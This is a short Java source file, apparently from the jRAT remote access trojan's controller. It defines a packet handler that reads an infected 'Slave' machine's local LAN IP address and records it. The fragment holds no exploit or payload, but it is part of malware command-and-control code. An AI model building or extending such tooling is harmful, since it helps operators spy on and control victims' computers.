package su.jrat.client.packets.incoming;

import java.io.DataInputStream;

import su.jrat.client.Slave;


public class Packet28InitLanAddress extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String raw = slave.readLine();
		slave.setLocalIP(raw);
	}

}
